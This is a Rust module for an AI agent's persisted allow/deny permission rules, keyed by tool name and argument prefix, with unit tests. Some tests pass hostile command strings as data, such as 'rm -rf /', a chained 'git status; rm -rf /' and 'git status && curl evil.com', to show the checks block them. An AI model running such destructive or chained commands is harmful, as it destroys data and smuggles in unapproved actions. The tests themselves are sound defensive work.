//! The persisted rule store consulted on the chat path.
//!
//! Persists Allow/Deny rules keyed by argument prefix in SQLite.
//! Lets the operator (or the desktop HITL "Always allow" button) add rules
//! that survive runtime restarts. A rule targets one agent or every agent.
//!
//! SQLite schema:
//! ```sql
//! CREATE TABLE permission_rules (
//!     id           INTEGER PRIMARY KEY AUTOINCREMENT,
//!     tool_name    TEXT NOT NULL,
//!     arg_prefix   TEXT,
//!     action       TEXT NOT NULL,  -- 'allow' or 'deny'
//!     created_at   INTEGER NOT NULL,
//!     created_by   TEXT,
//!     scope        TEXT NOT NULL DEFAULT 'global', -- 'agent' or 'global'
//!     project_path TEXT,           -- retired, never written
//!     agent_id     TEXT,
//!     expires_at   INTEGER
//! );
//! ```
//!
//! Rows of the retired `project` and `session` scopes, which a database
//! written by an older binary may still hold, are never read here: every query
//! selects the two live scopes only, and
//! [`crate::access_upgrade::run_access_upgrade`] converts them.

use std::path::Path;

use rusqlite::{params, Connection, OpenFlags};

use crate::error::PermissionError;

mod matching;
mod types;

pub use matching::extract_first_arg;
use matching::{current_unix_secs, row_to_rule, scan_rows};
pub use types::{PermissionScope, PrefixRule, RuleAction, ScopeContext};

/// Current Unix time in seconds, the clock every store of this crate stamps with.
pub(crate) fn unix_now() -> i64 {
    current_unix_secs()
}

/// Columns a [`PrefixRule`] is decoded from, in `row_to_rule` order.
const RULE_COLUMNS: &str =
    "id, tool_name, arg_prefix, action, created_at, created_by, scope, agent_id, expires_at";

/// Engine for prefix rules persisted in SQLite (layer 2).
///
/// Handles rule CRUD and evaluates tool invocations by looking for the most
/// specific rule (longest prefix) first.
pub struct PrefixRuleEngine {
    db: Connection,
}

impl PrefixRuleEngine {
    /// Opens (or creates) the SQLite database at the given path and migrates the schema.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] if opening or migrating fails.
    pub fn new(db_path: &Path) -> Result<Self, PermissionError> {
        let db = Connection::open_with_flags(
            db_path,
            OpenFlags::SQLITE_OPEN_READ_WRITE | OpenFlags::SQLITE_OPEN_CREATE,
        )?;
        db.execute_batch("PRAGMA journal_mode=WAL;")?;
        let engine = Self { db };
        engine.migrate()?;
        Ok(engine)
    }

    /// Checks whether the invocation (`tool_name`, `first_arg`) matches a
    /// persisted rule for every agent.
    ///
    /// Agent rules are not considered (use
    /// [`check_with_scope`](Self::check_with_scope)); expired rules are ignored.
    ///
    /// Rules are evaluated by decreasing specificity:
    /// - longest prefix first,
    /// - then rules without a prefix (None).
    ///
    /// Returns the first matching action, or `None` if no rule matches.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn check(
        &self,
        tool_name: &str,
        first_arg: Option<&str>,
    ) -> Result<Option<RuleAction>, PermissionError> {
        Ok(self
            .check_with_id(tool_name, first_arg)?
            .map(|(_, action)| action))
    }

    /// Variant of [`check`](Self::check) that also returns the rule identifier.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn check_with_id(
        &self,
        tool_name: &str,
        first_arg: Option<&str>,
    ) -> Result<Option<(i64, RuleAction)>, PermissionError> {
        self.match_in_db_global(tool_name, first_arg, current_unix_secs())
    }

    /// Evaluates rules with scope-aware filtering.
    ///
    /// Evaluation order (most specific to broadest):
    ///
    /// 1. DB rules with `scope = 'agent'` filtered by `scope_ctx.agent_id`.
    /// 2. DB rules with `scope = 'global'`.
    ///
    /// Within each tier, the rule with the longest prefix wins.
    /// Expired rules (`expires_at` in the past) are ignored and logged at warning level.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn check_with_scope(
        &self,
        tool_name: &str,
        first_arg: Option<&str>,
        scope_ctx: &ScopeContext,
    ) -> Result<Option<(i64, RuleAction)>, PermissionError> {
        let now = current_unix_secs();

        if let Some(agent_id) = scope_ctx.agent_id.as_deref() {
            if let Some(hit) = self.match_in_db_agent(tool_name, first_arg, agent_id, now)? {
                return Ok(Some(hit));
            }
        }

        self.match_in_db_global(tool_name, first_arg, now)
    }

    /// Persists a new rule and returns its auto-incremented identifier.
    ///
    /// # Errors
    ///
    /// - [`PermissionError::InvalidRule`] if `tool_name` is empty, or if
    ///   `scope == Agent` without a non-empty `agent_id`.
    /// - [`PermissionError::Database`] on SQLite error.
    pub fn add_rule(&mut self, rule: &PrefixRule) -> Result<i64, PermissionError> {
        if rule.tool_name.trim().is_empty() {
            return Err(PermissionError::InvalidRule(
                "tool_name must not be empty".to_string(),
            ));
        }
        if rule.scope == PermissionScope::Agent
            && rule
                .agent_id
                .as_deref()
                .map(str::trim)
                .unwrap_or("")
                .is_empty()
        {
            return Err(PermissionError::InvalidRule(
                "agent scope requires a non-empty agent_id".to_string(),
            ));
        }

        self.db.execute(
            "INSERT INTO permission_rules \
             (tool_name, arg_prefix, action, created_at, created_by, scope, agent_id, expires_at) \
             VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            params![
                rule.tool_name,
                rule.arg_prefix,
                rule.action.as_str(),
                rule.created_at,
                rule.created_by_agent,
                rule.scope.as_str(),
                rule.agent_id,
                rule.expires_at,
            ],
        )?;

        Ok(self.db.last_insert_rowid())
    }

    /// Removes the rule identified by `id`.
    ///
    /// Silent if the rule does not exist (use [`remove_rule_checked`](Self::remove_rule_checked)
    /// to distinguish the two cases).
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn remove_rule(&mut self, id: i64) -> Result<(), PermissionError> {
        self.db
            .execute("DELETE FROM permission_rules WHERE id = ?", params![id])?;
        Ok(())
    }

    /// Removes the rule identified by `id` and returns `true` if a row was deleted.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn remove_rule_checked(&mut self, id: i64) -> Result<bool, PermissionError> {
        let affected = self
            .db
            .execute("DELETE FROM permission_rules WHERE id = ?", params![id])?;
        Ok(affected > 0)
    }

    /// Removes all persisted rules of *scope*.
    ///
    /// Returns the number of rows deleted.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn remove_rules_by_scope(
        &mut self,
        scope: PermissionScope,
    ) -> Result<u32, PermissionError> {
        let affected = self.db.execute(
            "DELETE FROM permission_rules WHERE scope = ?",
            params![scope.as_str()],
        )?;
        Ok(affected as u32)
    }

    /// Removes all rules whose `created_by` field matches `created_by`.
    ///
    /// Used for audit or targeted reset operations (for example, clearing all
    /// rules written by a particular agent before it proposes new ones).
    ///
    /// Returns the number of rows deleted.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn remove_rules_by_creator(&mut self, created_by: &str) -> Result<u32, PermissionError> {
        let affected = self.db.execute(
            "DELETE FROM permission_rules WHERE created_by = ?",
            params![created_by],
        )?;
        Ok(affected as u32)
    }

    /// Lists `scope = 'agent'` rules filtered by `agent_id`.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn list_rules_for_agent(&self, agent_id: &str) -> Result<Vec<PrefixRule>, PermissionError> {
        self.query_rules(
            &format!(
                "SELECT {RULE_COLUMNS} FROM permission_rules \
                 WHERE scope = 'agent' AND agent_id = ? ORDER BY id ASC"
            ),
            &[rusqlite::types::Value::Text(agent_id.to_string())],
        )
    }

    // TEST-ONLY: a test oracle over every persisted rule. Production lists
    // through `list_rules_filtered` (the desktop and the CLI) and
    // `list_rules_for_agent` (the free chat).
    /// Returns all persisted rules, sorted by ascending identifier.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn list_rules(&self) -> Result<Vec<PrefixRule>, PermissionError> {
        self.list_rules_filtered(None)
    }

    /// Returns persisted rules, optionally filtered by scope.
    ///
    /// - `scope = Some(Agent)`: rules of any single agent.
    /// - `scope = Some(Global)`: rules for every agent.
    /// - `scope = None`: both.
    ///
    /// # Errors
    ///
    /// Returns [`PermissionError::Database`] on SQLite error.
    pub fn list_rules_filtered(
        &self,
        scope: Option<PermissionScope>,
    ) -> Result<Vec<PrefixRule>, PermissionError> {
        match scope {
            Some(s) => self.query_rules(
                &format!(
                    "SELECT {RULE_COLUMNS} FROM permission_rules \
                     WHERE scope = ? ORDER BY id ASC"
                ),
                &[rusqlite::types::Value::Text(s.as_str().to_string())],
            ),
            None => self.query_rules(
                &format!(
                    "SELECT {RULE_COLUMNS} FROM permission_rules \
                     WHERE scope IN ('agent', 'global') ORDER BY id ASC"
                ),
                &[],
            ),
        }
    }

    // ─────────────────────────────────────────────
    // Private
    // ─────────────────────────────────────────────

    fn query_rules(
        &self,
        sql: &str,
        params: &[rusqlite::types::Value],
    ) -> Result<Vec<PrefixRule>, PermissionError> {
        let mut stmt = self.db.prepare(sql)?;
        let rules = stmt
            .query_map(rusqlite::params_from_iter(params.iter()), row_to_rule)?
            .collect::<Result<Vec<_>, _>>()?
            .into_iter()
            .collect::<Result<Vec<_>, PermissionError>>()?;
        Ok(rules)
    }

    fn match_in_db_agent(
        &self,
        tool_name: &str,
        first_arg: Option<&str>,
        agent_id: &str,
        now: i64,
    ) -> Result<Option<(i64, RuleAction)>, PermissionError> {
        let mut stmt = self.db.prepare_cached(
            "SELECT id, arg_prefix, action, expires_at FROM permission_rules \
             WHERE tool_name = ? AND scope = 'agent' AND agent_id = ? \
             ORDER BY CASE WHEN arg_prefix IS NULL THEN 0 ELSE LENGTH(arg_prefix) END DESC",
        )?;
        let mut rows = stmt.query(params![tool_name, agent_id])?;
        scan_rows(&mut rows, tool_name, "agent", first_arg, now)
    }

    fn match_in_db_global(
        &self,
        tool_name: &str,
        first_arg: Option<&str>,
        now: i64,
    ) -> Result<Option<(i64, RuleAction)>, PermissionError> {
        let mut stmt = self.db.prepare_cached(
            "SELECT id, arg_prefix, action, expires_at FROM permission_rules \
             WHERE tool_name = ? AND scope = 'global' \
             ORDER BY CASE WHEN arg_prefix IS NULL THEN 0 ELSE LENGTH(arg_prefix) END DESC",
        )?;
        let mut rows = stmt.query(params![tool_name])?;
        scan_rows(&mut rows, tool_name, "global", first_arg, now)
    }

    fn migrate(&self) -> Result<(), PermissionError> {
        crate::governance_schema::open_governance_schema(&self.db)?;
        Ok(())
    }
}

// ─────────────────────────────────────────────
// Free helpers
// ─────────────────────────────────────────────

// ─────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::matching::prefix_matches;
    use super::*;
    use tempfile::NamedTempFile;

    fn tmp_engine() -> (PrefixRuleEngine, NamedTempFile) {
        let file = NamedTempFile::new().expect("tempfile");
        let engine = PrefixRuleEngine::new(file.path()).expect("engine init");
        (engine, file)
    }

    fn now() -> i64 {
        current_unix_secs()
    }

    fn rule(tool: &str, prefix: Option<&str>, action: RuleAction) -> PrefixRule {
        PrefixRule {
            tool_name: tool.into(),
            arg_prefix: prefix.map(str::to_string),
            action,
            created_at: now(),
            ..PrefixRule::default()
        }
    }

    #[test]
    fn prefix_rule_matches_git_wildcard() {
        // GIVEN an engine carrying an allow rule scoped to the `git` prefix
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&rule("bash_executor", Some("git"), RuleAction::Allow))
            .expect("add_rule");
        // WHEN a command starting with that prefix is checked
        let result = engine
            .check("bash_executor", Some("git push origin main"))
            .expect("check");
        // THEN the rule matches and allows it
        assert_eq!(result, Some(RuleAction::Allow));
    }

    #[test]
    fn prefix_matches_rejects_non_matching_and_missing_arg() {
        // GIVEN a rule scoped to a concrete prefix, and calls that do not carry it
        // A concrete prefix that the first argument does not start with must not
        // match, and a required prefix with no argument must not match either.
        // Pins the function against a mutant that unconditionally returns true,
        // which would make a scoped rule apply to every call.
        // WHEN the prefix match is evaluated on each
        // THEN a different argument does not match, and a missing one does not either
        assert!(!prefix_matches("file_read", Some("git"), Some("rm -rf /")));
        assert!(!prefix_matches("file_read", Some("git"), None));

        // The matching and wildcard (no-prefix) cases still hold for an
        // ordinary, argument-scoped tool.
        // THEN a matching argument does match, and a rule with no prefix matches anything
        assert!(prefix_matches("file_read", Some("git"), Some("git push")));
        assert!(prefix_matches("file_read", None, Some("anything")));
    }

    #[test]
    fn prefix_matches_never_blanket_allows_code_executor() {
        // GIVEN a code executor (bash / python)
        // WHEN a no-prefix rule is evaluated against any argument
        // THEN it never grants a blanket allow (unlike an ordinary tool).
        // Pins the fix for the "always allow bash = blank check" finding.
        assert!(!prefix_matches("bash_executor", None, Some("rm -rf /")));
        assert!(!prefix_matches("bash_executor", None, Some("git status")));
        assert!(!prefix_matches("python_executor", None, Some("import os")));
        assert!(!prefix_matches("bash_executor", None, None));
    }

    #[test]
    fn prefix_matches_code_executor_rejects_chaining_but_keeps_simple() {
        // GIVEN a legitimate prefix rule on a code executor
        // WHEN the argument chains a second command past the prefix
        // THEN it does not match; a single simple command still does.
        assert!(!prefix_matches(
            "bash_executor",
            Some("git"),
            Some("git status; rm -rf /")
        ));
        assert!(!prefix_matches(
            "bash_executor",
            Some("git"),
            Some("git status && curl evil.com")
        ));
        assert!(prefix_matches(
            "bash_executor",
            Some("git"),
            Some("git status")
        ));
        assert!(prefix_matches(
            "bash_executor",
            Some("git"),
            Some("git push origin main")
        ));
    }

    #[test]
    fn prefix_rule_no_match_returns_none() {
        // GIVEN an engine carrying no rule at all
        let (engine, _tmp) = tmp_engine();
        // WHEN a command is checked
        let result = engine
            .check("bash_executor", Some("git status"))
            .expect("check");
        // THEN no verdict comes back, so the caller has to ask the operator
        assert!(result.is_none());
    }

    #[test]
    fn prefix_rule_deny_action_returned() {
        // GIVEN an engine carrying a deny rule scoped to a path prefix
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&rule("file_write", Some("/etc"), RuleAction::Deny))
            .expect("add_rule");
        // WHEN a write under that prefix is checked
        let result = engine
            .check("file_write", Some("/etc/passwd"))
            .expect("check");
        // THEN the deny comes back, not an absence of verdict
        assert_eq!(result, Some(RuleAction::Deny));
    }

    #[test]
    fn prefix_rule_none_prefix_matches_any_arg() {
        // GIVEN an engine carrying an allow rule with no argument prefix
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&rule("file_read", None, RuleAction::Allow))
            .expect("add_rule");
        // WHEN a call with an argument, then one without, are checked
        // THEN both are allowed
        assert_eq!(
            engine
                .check("file_read", Some("any/path.txt"))
                .expect("check"),
            Some(RuleAction::Allow)
        );
        assert_eq!(
            engine.check("file_read", None).expect("check"),
            Some(RuleAction::Allow)
        );
    }

    #[test]
    fn persisted_blanket_rule_does_not_allow_code_executor() {
        // GIVEN a persisted no-prefix Allow rule on a code executor (what the
        // legacy "always allow bash" click wrote)
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&rule("bash_executor", None, RuleAction::Allow))
            .expect("add_rule");
        // WHEN an arbitrary command is checked
        // THEN the blanket rule does not auto-allow it
        assert!(engine
            .check("bash_executor", Some("rm -rf /"))
            .expect("check")
            .is_none());
        assert!(engine
            .check("bash_executor", Some("git status"))
            .expect("check")
            .is_none());
    }

    #[test]
    fn persisted_prefix_rule_on_code_executor_rejects_chaining() {
        // GIVEN a persisted prefix rule `bash_executor(git)`
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&rule("bash_executor", Some("git"), RuleAction::Allow))
            .expect("add_rule");
        // WHEN a chained command shares the prefix
        // THEN it is not auto-allowed, but a single simple command still is
        assert!(engine
            .check("bash_executor", Some("git status; rm -rf /"))
            .expect("check")
            .is_none());
        assert_eq!(
            engine
                .check("bash_executor", Some("git status"))
                .expect("check"),
            Some(RuleAction::Allow)
        );
    }

    #[test]
    fn remove_rule_cleans_up() {
        // GIVEN an engine carrying one rule
        let (mut engine, _tmp) = tmp_engine();
        let id = engine
            .add_rule(&rule("bash_executor", Some("git"), RuleAction::Allow))
            .expect("add_rule");
        // WHEN the rule is removed and the command checked again
        engine.remove_rule(id).expect("remove_rule");
        let result = engine
            .check("bash_executor", Some("git status"))
            .expect("check");
        // THEN no verdict comes back: the rule is gone from the store, not only from memory
        assert!(result.is_none());
    }

    #[test]
    fn remove_rule_checked_reports_existence() {
        // GIVEN an engine carrying one rule
        let (mut engine, _tmp) = tmp_engine();
        let id = engine
            .add_rule(&rule("bash_executor", None, RuleAction::Allow))
            .expect("add_rule");
        // WHEN the same id is removed twice
        // THEN the first removal reports a hit, the second reports none
        assert!(engine.remove_rule_checked(id).expect("remove_rule_checked"));
        assert!(!engine.remove_rule_checked(id).expect("remove_rule_checked"));
    }

    #[test]
    fn list_rules_returns_all() {
        // GIVEN an engine carrying two rules on two different tools
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&rule("tool_a", Some("prefix_x"), RuleAction::Allow))
            .expect("add_rule");
        engine
            .add_rule(&rule("tool_b", Some("prefix_y"), RuleAction::Allow))
            .expect("add_rule");
        // WHEN the rules are listed
        let rules = engine.list_rules().expect("list_rules");
        // THEN both come back
        assert_eq!(rules.len(), 2);
    }

    fn rule_with_creator(tool: &str, action: RuleAction, creator: &str) -> PrefixRule {
        PrefixRule {
            tool_name: tool.into(),
            action,
            created_at: now(),
            created_by_agent: Some(creator.into()),
            ..PrefixRule::default()
        }
    }

    #[test]
    fn remove_rules_by_creator_deletes_only_matching() {
        // GIVEN two "onboarding-agent" rules + one "user-hitl"
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&rule_with_creator(
                "tool_a",
                RuleAction::Allow,
                "onboarding-agent",
            ))
            .expect("add_rule");
        engine
            .add_rule(&rule_with_creator(
                "tool_b",
                RuleAction::Deny,
                "onboarding-agent",
            ))
            .expect("add_rule");
        engine
            .add_rule(&rule_with_creator("tool_c", RuleAction::Allow, "user-hitl"))
            .expect("add_rule");

        // WHEN removing by creator
        let removed = engine
            .remove_rules_by_creator("onboarding-agent")
            .expect("remove_rules_by_creator");

        // THEN two rules deleted, the user-hitl rule remains
        assert_eq!(removed, 2);
        let remaining = engine.list_rules().expect("list_rules");
        assert_eq!(remaining.len(), 1);
        assert_eq!(remaining[0].created_by_agent.as_deref(), Some("user-hitl"));
    }

    #[test]
    fn remove_rules_by_creator_unknown_returns_zero() {
        // GIVEN an existing rule
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&rule_with_creator("tool_a", RuleAction::Allow, "user-hitl"))
            .expect("add_rule");
        // WHEN removing a non-existent creator
        let removed = engine
            .remove_rules_by_creator("ghost")
            .expect("remove_rules_by_creator");
        // THEN zero deletions, the rule remains
        assert_eq!(removed, 0);
        assert_eq!(engine.list_rules().expect("list").len(), 1);
    }

    #[test]
    fn add_rule_rejects_empty_tool_name() {
        let (mut engine, _tmp) = tmp_engine();
        // GIVEN a rule whose tool name is empty
        let r = PrefixRule {
            tool_name: String::new(),
            ..PrefixRule::default()
        };
        // WHEN it is added
        // THEN the engine refuses it as an invalid rule
        assert!(matches!(
            engine.add_rule(&r),
            Err(PermissionError::InvalidRule(_))
        ));
    }

    #[test]
    fn test_agent_rule_filtered_by_id() {
        // GIVEN a stored rule scoped to one agent
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&PrefixRule {
                tool_name: "bash_executor".into(),
                arg_prefix: Some("git".into()),
                action: RuleAction::Allow,
                created_at: now(),
                scope: PermissionScope::Agent,
                agent_id: Some("apollia:chat".into()),
                ..PrefixRule::default()
            })
            .expect("add_rule");
        // WHEN the command is checked under another agent, then under that one
        let ctx_other = ScopeContext {
            agent_id: Some("apollia:other".into()),
        };
        let hit = engine
            .check_with_scope("bash_executor", Some("git status"), &ctx_other)
            .expect("check_with_scope");
        // THEN the other agent gets no verdict, and the owning agent gets the allow
        assert!(
            hit.is_none(),
            "rule for apollia:chat must not match apollia:other"
        );

        let ctx_chat = ScopeContext {
            agent_id: Some("apollia:chat".into()),
        };
        let hit = engine
            .check_with_scope("bash_executor", Some("git status"), &ctx_chat)
            .expect("check_with_scope");
        assert!(matches!(hit, Some((_, RuleAction::Allow))));
    }

    #[test]
    fn test_add_rule_rejects_agent_scope_without_id() {
        let (mut engine, _tmp) = tmp_engine();
        // GIVEN a rule at the agent scope, carrying no agent id
        let r = PrefixRule {
            tool_name: "bash_executor".into(),
            scope: PermissionScope::Agent,
            agent_id: None,
            ..PrefixRule::default()
        };
        // WHEN it is added
        // THEN the engine refuses it: an agent rule with no agent matches every agent
        assert!(matches!(
            engine.add_rule(&r),
            Err(PermissionError::InvalidRule(_))
        ));
    }

    #[test]
    fn test_global_rule_applies_to_every_agent() {
        // GIVEN a stored rule at the global scope
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&PrefixRule {
                tool_name: "bash_executor".into(),
                arg_prefix: Some("git".into()),
                action: RuleAction::Allow,
                created_at: now(),
                scope: PermissionScope::Global,
                ..PrefixRule::default()
            })
            .expect("add_rule");
        for agent_id in [None, Some("apollia:chat".to_string()), Some("a1".into())] {
            // WHEN the command is checked under any agent, or none
            let ctx = ScopeContext { agent_id };
            let hit = engine
                .check_with_scope("bash_executor", Some("git status"), &ctx)
                .expect("check_with_scope");
            // THEN the global rule answers
            assert!(matches!(hit, Some((_, RuleAction::Allow))));
        }
    }

    #[test]
    fn test_expired_rule_ignored() {
        // GIVEN a stored global rule whose expiry is already past
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&PrefixRule {
                tool_name: "bash_executor".into(),
                arg_prefix: Some("git".into()),
                action: RuleAction::Allow,
                created_at: now() - 1000,
                scope: PermissionScope::Global,
                expires_at: Some(now() - 1),
                ..PrefixRule::default()
            })
            .expect("add_rule");
        let ctx = ScopeContext::default();
        // WHEN the command is checked, through the scoped path and the legacy one
        let hit = engine
            .check_with_scope("bash_executor", Some("git status"), &ctx)
            .expect("check_with_scope");
        // THEN neither path returns a verdict: an expired rule grants nothing
        assert!(hit.is_none());
        let hit_legacy = engine
            .check("bash_executor", Some("git status"))
            .expect("check");
        assert!(hit_legacy.is_none());
    }

    #[test]
    fn test_scope_priority_agent_over_global() {
        // GIVEN the same command covered for every agent and for one agent
        let (mut engine, _tmp) = tmp_engine();
        let global_id = engine
            .add_rule(&PrefixRule {
                tool_name: "bash_executor".into(),
                arg_prefix: Some("git".into()),
                action: RuleAction::Deny,
                created_at: now(),
                scope: PermissionScope::Global,
                ..PrefixRule::default()
            })
            .expect("add_rule global");
        let agent_id_rule = engine
            .add_rule(&PrefixRule {
                tool_name: "bash_executor".into(),
                arg_prefix: Some("git".into()),
                action: RuleAction::Allow,
                created_at: now(),
                scope: PermissionScope::Agent,
                agent_id: Some("apollia:chat".into()),
                ..PrefixRule::default()
            })
            .expect("add_rule agent");

        // WHEN it is checked under that agent
        let ctx = ScopeContext {
            agent_id: Some("apollia:chat".into()),
        };
        let hit = engine
            .check_with_scope("bash_executor", Some("git status"), &ctx)
            .expect("check_with_scope");
        // THEN the agent rule wins over the global one
        assert_eq!(hit, Some((agent_id_rule, RuleAction::Allow)));

        // WHEN it is checked with no agent
        let hit = engine
            .check_with_scope(
                "bash_executor",
                Some("git status"),
                &ScopeContext::default(),
            )
            .expect("check_with_scope");
        // THEN the global rule answers, as the last resort
        assert_eq!(hit, Some((global_id, RuleAction::Deny)));
    }

    #[test]
    fn test_backward_compat_check_without_scope() {
        // GIVEN a stored rule at the global scope
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&PrefixRule {
                tool_name: "bash_executor".into(),
                arg_prefix: Some("git".into()),
                action: RuleAction::Allow,
                created_at: now(),
                scope: PermissionScope::Global,
                ..PrefixRule::default()
            })
            .expect("add_rule");
        // WHEN the command is checked through the scopeless legacy entry point
        let result = engine
            .check("bash_executor", Some("git push"))
            .expect("check");
        // THEN the rule still answers, so the older callers keep working
        assert_eq!(result, Some(RuleAction::Allow));
    }

    #[test]
    fn list_rules_filtered_by_scope() {
        // GIVEN one global rule and one agent rule
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&PrefixRule {
                tool_name: "tool_g".into(),
                action: RuleAction::Allow,
                created_at: now(),
                scope: PermissionScope::Global,
                ..PrefixRule::default()
            })
            .expect("add_rule");
        engine
            .add_rule(&PrefixRule {
                tool_name: "tool_a".into(),
                action: RuleAction::Allow,
                created_at: now(),
                scope: PermissionScope::Agent,
                agent_id: Some("a1".into()),
                ..PrefixRule::default()
            })
            .expect("add_rule");

        // WHEN the rules are listed by scope, then unfiltered
        let globals = engine
            .list_rules_filtered(Some(PermissionScope::Global))
            .expect("list globals");
        let agents = engine
            .list_rules_filtered(Some(PermissionScope::Agent))
            .expect("list agents");
        let all = engine.list_rules_filtered(None).expect("list all");

        // THEN each filter returns its own rule, and no filter returns both
        assert_eq!(globals.len(), 1);
        assert_eq!(globals[0].tool_name, "tool_g");
        assert_eq!(agents.len(), 1);
        assert_eq!(agents[0].tool_name, "tool_a");
        assert_eq!(all.len(), 2);
    }

    #[test]
    fn rows_of_retired_scopes_are_never_read() {
        // GIVEN a database still holding a project rule and a session rule, as
        // an older binary wrote them, next to a live global rule
        let (mut engine, tmp) = tmp_engine();
        engine
            .add_rule(&rule("tool_g", None, RuleAction::Deny))
            .expect("add_rule");
        let conn = Connection::open(tmp.path()).expect("open");
        conn.execute_batch(
            "INSERT INTO permission_rules (tool_name, action, created_at, scope, project_path)
                 VALUES ('tool_g', 'allow', 1, 'project', '/home/u/p');
             INSERT INTO permission_rules (tool_name, action, created_at, scope)
                 VALUES ('tool_g', 'allow', 1, 'session');",
        )
        .expect("legacy rows");

        // WHEN the rules are listed and the tool is checked
        let all = engine.list_rules_filtered(None).expect("list");
        let hit = engine.check("tool_g", None).expect("check");

        // THEN only the live rule is seen, and it decides
        assert_eq!(all.len(), 1);
        assert_eq!(all[0].scope, PermissionScope::Global);
        assert_eq!(hit, Some(RuleAction::Deny));
    }

    #[test]
    fn remove_rules_by_scope_clears_only_that_scope() {
        // GIVEN one global rule and one agent rule
        let (mut engine, _tmp) = tmp_engine();
        engine
            .add_rule(&rule("tool_g", None, RuleAction::Allow))
            .expect("add_rule");
        engine
            .add_rule(&PrefixRule {
                scope: PermissionScope::Agent,
                agent_id: Some("a1".into()),
                ..rule("tool_a", None, RuleAction::Allow)
            })
            .expect("add_rule");

        // WHEN the global scope is cleared
        let removed = engine
            .remove_rules_by_scope(PermissionScope::Global)
            .expect("remove");

        // THEN only the global rule is gone
        assert_eq!(removed, 1);
        let left = engine.list_rules().expect("list");
        assert_eq!(left.len(), 1);
        assert_eq!(left[0].tool_name, "tool_a");
    }

    #[test]
    fn extract_first_arg_uses_cmd_key() {
        // GIVEN an object carrying a `cmd` key next to another string key
        let input = serde_json::json!({"cmd": "git status", "other": "value"});
        // WHEN the first argument is extracted
        let arg = extract_first_arg(&input);
        // THEN the priority key wins
        assert_eq!(arg, Some("git status".to_string()));
    }

    #[test]
    fn extract_first_arg_string_input() {
        // GIVEN a bare string input
        let input = serde_json::json!("direct string");
        // WHEN the first argument is extracted
        let arg = extract_first_arg(&input);
        // THEN the string itself is returned
        assert_eq!(arg, Some("direct string".to_string()));
    }

    #[test]
    fn extract_first_arg_empty_object_returns_none() {
        // GIVEN an empty object
        let input = serde_json::json!({});
        // WHEN the first argument is extracted
        let arg = extract_first_arg(&input);
        // THEN nothing is found
        assert!(arg.is_none());
    }
}
